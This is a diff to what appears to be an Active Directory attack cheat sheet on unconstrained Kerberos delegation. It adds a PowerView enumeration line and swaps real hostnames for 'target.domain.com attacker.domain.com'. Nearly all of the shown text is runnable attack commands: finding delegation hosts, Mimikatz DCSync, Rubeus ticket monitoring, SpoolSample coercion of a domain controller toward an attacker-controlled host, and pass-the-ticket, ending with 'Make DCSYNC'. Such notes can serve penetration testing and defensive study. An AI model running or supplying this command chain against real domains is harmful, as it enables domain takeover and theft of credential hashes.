@@ -1,5 +1,11 @@
+[ENUM]
+
+Using PowerView:
+Get-DomainComputer -Unconstrained
+
 Confirm/find computers on a domain that have unrestricted kerberos delegation: 
 Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
+
 
 [Attack using Mimikatz]
 
@@ -33,7 +39,7 @@ PS C:\Users\Administrator> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /d
 [Attack using Rubeus]
 
 PS C:\Users\Administrator> .\Rubeus.exe monitor /interval:5
-PS C:\Users\Administrator> .\SpoolSample.exe dc03.infinity.com web05.infinity.com
+PS C:\Users\Administrator> .\SpoolSample.exe target.domain.com attacker.domain.com
 PS C:\Users\Administrator> .\Rubeus.exe ptt /ticket:[BASE64_HERE]
 PS C:\Users\Administrator> .\Rubeus.exe klist
 Make DCSYNC.
